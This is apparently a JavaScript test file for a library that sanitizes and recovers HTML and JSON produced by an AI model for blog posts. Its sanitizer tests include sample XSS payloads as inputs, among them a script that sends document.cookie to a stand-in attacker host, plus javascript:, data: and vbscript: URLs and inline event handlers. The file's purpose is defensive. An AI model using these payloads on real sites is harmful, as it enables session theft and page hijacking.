/*
 * Tests for the model-output recovery layer.
 *
 * Run: `npm test`  (delegates to `node --test tests/`)
 *
 * Why these specific cases: every entry below is a real failure mode we've
 * either seen in production (Haiku fence-wrapping, truncated streams) or
 * one a future contributor might break by accident (script tags slipping
 * through the sanitizer, javascript: URLs, on*= handlers).
 *
 * Keep this file pure-JS — recovery.js itself has no DOM/fetch/storage
 * dependencies, so these tests run in plain Node with no stubs.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const {
  sanitizeHtml,
  escapeText,
  parseJsonFromModel,
  extractClaudeText,
  fallbackPostFromRawModelText
} = require('../recovery.js');

/* ---------- sanitizeHtml ---------- */

test('sanitizeHtml: leaves benign HTML alone', () => {
  const html = '<h2>Hello</h2><p>World <strong>bold</strong> <a href="https://example.com">link</a>.</p>';
  assert.equal(sanitizeHtml(html), html);
});

test('sanitizeHtml: strips <script> with body', () => {
  const out = sanitizeHtml('<p>ok</p><script>alert(1)</script><p>still ok</p>');
  assert.match(out, /<p>ok<\/p>\s*<p>still ok<\/p>/);
  assert.doesNotMatch(out, /script/i);
});

test('sanitizeHtml: strips self-closing dangerous tags', () => {
  const out = sanitizeHtml('<p>x</p><iframe src="https://evil"/><meta http-equiv="refresh">');
  assert.doesNotMatch(out, /iframe|meta/i);
});

test('sanitizeHtml: removes inline event handlers (double-quoted)', () => {
  const out = sanitizeHtml('<a href="#" onclick="bad()">x</a>');
  assert.doesNotMatch(out, /onclick/i);
  assert.match(out, /href="#"/);
});

test('sanitizeHtml: removes inline event handlers (single-quoted)', () => {
  const out = sanitizeHtml("<a href='#' onmouseover='bad()'>x</a>");
  assert.doesNotMatch(out, /onmouseover/i);
});

test('sanitizeHtml: removes inline event handlers (unquoted)', () => {
  const out = sanitizeHtml('<a href="#" onclick=bad()>x</a>');
  assert.doesNotMatch(out, /onclick/i);
});

test('sanitizeHtml: neutralizes javascript: URLs', () => {
  const out = sanitizeHtml('<a href="javascript:alert(1)">x</a>');
  assert.match(out, /href="#"/);
  assert.doesNotMatch(out, /javascript:/i);
});

test('sanitizeHtml: neutralizes data: URLs', () => {
  const out = sanitizeHtml('<img src="data:text/html,<script>x</script>">');
  assert.match(out, /src="#"/);
});

test('sanitizeHtml: neutralizes vbscript: URLs', () => {
  const out = sanitizeHtml('<a href="vbscript:msgbox">x</a>');
  assert.match(out, /href="#"/);
});

test('sanitizeHtml: handles empty + null input', () => {
  assert.equal(sanitizeHtml(''), '');
  assert.equal(sanitizeHtml(null), '');
  assert.equal(sanitizeHtml(undefined), '');
});

test('sanitizeHtml: prompt-injection style — script in voice guide making it through', () => {
  const injected = '<p>Welcome!</p><script>fetch("https://attacker?c="+document.cookie)</script>';
  const out = sanitizeHtml(injected);
  assert.doesNotMatch(out, /script|fetch|attacker/i);
});

/* ---------- escapeText ---------- */

test('escapeText: escapes the five HTML metacharacters', () => {
  assert.equal(escapeText('<a href="x">&\'</a>'), '&lt;a href=&quot;x&quot;&gt;&amp;&#39;&lt;/a&gt;');
});

test('escapeText: coerces non-strings', () => {
  assert.equal(escapeText(42), '42');
  assert.equal(escapeText(null), 'null');
});

/* ---------- parseJsonFromModel ---------- */

test('parseJsonFromModel: clean JSON (Sonnet/Opus happy path)', () => {
  const r = parseJsonFromModel('{"title":"x","content":"<p>y</p>"}');
  assert.equal(r.ok, true);
  assert.equal(r.value.title, 'x');
});

test('parseJsonFromModel: fenced JSON with json tag (Haiku failure mode)', () => {
  const raw = '```json\n{"title":"x","content":"<p>y</p>"}\n```';
  const r = parseJsonFromModel(raw);
  assert.equal(r.ok, true);
  assert.equal(r.value.title, 'x');
});

test('parseJsonFromModel: fenced JSON without tag', () => {
  const raw = '```\n{"title":"x","content":"<p>y</p>"}\n```';
  const r = parseJsonFromModel(raw);
  assert.equal(r.ok, true);
});

test('parseJsonFromModel: preamble before JSON', () => {
  const raw = 'Here is the post:\n{"title":"x","content":"<p>y</p>"}';
  const r = parseJsonFromModel(raw);
  assert.equal(r.ok, true);
  assert.equal(r.value.content, '<p>y</p>');
});

test('parseJsonFromModel: postamble after JSON', () => {
  const raw = '{"title":"x","content":"<p>y</p>"}\nLet me know if you want changes!';
  const r = parseJsonFromModel(raw);
  assert.equal(r.ok, true);
});

test('parseJsonFromModel: preamble + postamble combined', () => {
  const raw = 'Here is the post:\n{"title":"x","content":"<p>y</p>"}\nThanks!';
  const r = parseJsonFromModel(raw);
  assert.equal(r.ok, true);
});

test('parseJsonFromModel: garbage in fails cleanly (no throw, attempts populated)', () => {
  const r = parseJsonFromModel('this is not JSON or HTML, it is just text.');
  assert.equal(r.ok, false);
  assert.ok(Array.isArray(r.attempts));
  assert.ok(r.attempts.length >= 1);
  assert.ok(typeof r.error === 'string');
});

test('parseJsonFromModel: empty string fails cleanly', () => {
  const r = parseJsonFromModel('');
  assert.equal(r.ok, false);
});

test('parseJsonFromModel: nested objects parse intact', () => {
  const raw = '```json\n{"title":"x","content":"<p>y</p>","altTextSuggestions":["a","b"],"meta":{"k":"v"}}\n```';
  const r = parseJsonFromModel(raw);
  assert.equal(r.ok, true);
  assert.deepEqual(r.value.altTextSuggestions, ['a', 'b']);
  assert.equal(r.value.meta.k, 'v');
});

/* ---------- extractClaudeText ---------- */

test('extractClaudeText: legacy non-streaming JSON shape', () => {
  const data = { content: [{ text: 'Hello ' }, { text: 'world' }] };
  assert.equal(extractClaudeText(data), 'Hello world');
});

test('extractClaudeText: SSE stream of text_delta events', () => {
  const sse = [
    'event: content_block_delta',
    'data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"Hello "}}',
    '',
    'event: content_block_delta',
    'data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"world"}}',
    '',
    'event: message_stop',
    'data: [DONE]'
  ].join('\n');
  assert.equal(extractClaudeText(sse), 'Hello world');
});

test('extractClaudeText: content_block_start events contribute their text', () => {
  const sse = [
    'data: {"type":"content_block_start","content_block":{"type":"text","text":"Start "}}',
    '',
    'data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"end"}}'
  ].join('\n');
  assert.equal(extractClaudeText(sse), 'Start end');
});

test('extractClaudeText: malformed data line is skipped, not thrown', () => {
  const sse = [
    'data: {this is not JSON',
    '',
    'data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"ok"}}'
  ].join('\n');
  assert.equal(extractClaudeText(sse), 'ok');
});

test('extractClaudeText: empty/non-string returns empty string', () => {
  assert.equal(extractClaudeText(''), '');
  assert.equal(extractClaudeText(null), '');
  assert.equal(extractClaudeText(undefined), '');
  assert.equal(extractClaudeText(42), '');
});

test('extractClaudeText: only [DONE] markers returns empty', () => {
  assert.equal(extractClaudeText('data: [DONE]\n\n'), '');
});

/* ---------- fallbackPostFromRawModelText ---------- */

test('fallback: returns null on empty input', () => {
  assert.equal(fallbackPostFromRawModelText('', 'fallback'), null);
  assert.equal(fallbackPostFromRawModelText(null, 'fallback'), null);
});

test('fallback: recovers raw HTML output as content', () => {
  const raw = '<h2>Title</h2><p>Body paragraph.</p>';
  const r = fallbackPostFromRawModelText(raw, 'My Post');
  assert.ok(r);
  assert.equal(r.title, 'My Post');
  assert.match(r.content, /<h2>Title<\/h2>/);
  assert.match(r.seoNotes, /raw HTML/);
});

test('fallback: raw HTML output is also sanitized', () => {
  const raw = '<p>ok</p><script>alert(1)</script>';
  const r = fallbackPostFromRawModelText(raw, 'Post');
  assert.ok(r);
  assert.doesNotMatch(r.content, /script/i);
});

test('fallback: recovers from JSON truncated mid-content', () => {
  // Stream cut off after content's HTML began — mimics Anthropic disconnect.
  const raw = '{"title":"Spring opening","content":"<h2>Steps</h2><p>First, remove the cover.</p><p>Second, ';
  const r = fallbackPostFromRawModelText(raw, 'Fallback');
  assert.ok(r, 'expected a recovery');
  assert.equal(r.title, 'Spring opening');
  assert.match(r.content, /<h2>Steps<\/h2>/);
  assert.match(r.content, /First, remove the cover\./);
  assert.match(r.seoNotes, /cut off/);
});

test('fallback: recovers from JSON with content + closing fields visible', () => {
  // Common Haiku misbehavior: meta/seo fields appended in JSON and we want
  // to drop them when reconstructing content.
  const raw = '{"title":"x","content":"<p>body</p>","metaDescription":"meta","altTextSuggestions":[],"seoNotes":"notes"}';
  const r = fallbackPostFromRawModelText(raw, 'Post');
  assert.ok(r);
  assert.equal(r.metaDescription, 'meta');
  assert.equal(r.seoNotes, 'notes');
  assert.match(r.content, /^<p>body<\/p>$/);
});

test('fallback: returns null when content has no recognizable HTML', () => {
  const raw = '{"title":"x","content":"just a string with no tags"';
  const r = fallbackPostFromRawModelText(raw, 'Post');
  assert.equal(r, null);
});

test('fallback: returns null on garbage with no JSON shape', () => {
  const r = fallbackPostFromRawModelText('the model said something useless', 'Post');
  assert.equal(r, null);
});

test('fallback: falls back to provided title when JSON title not parseable', () => {
  const raw = '{"content":"<p>ok</p>","title":';  // title key present but value broken
  const r = fallbackPostFromRawModelText(raw, 'Default Title');
  assert.ok(r);
  assert.equal(r.title, 'Default Title');
});

test('fallback: prompt-injected script in raw HTML is sanitized away', () => {
  const raw = '<p>Hello</p><script>steal()</script><p>World</p>';
  const r = fallbackPostFromRawModelText(raw, 'Post');
  assert.ok(r);
  assert.doesNotMatch(r.content, /script|steal/i);
  assert.match(r.content, /Hello.*World/s);
});
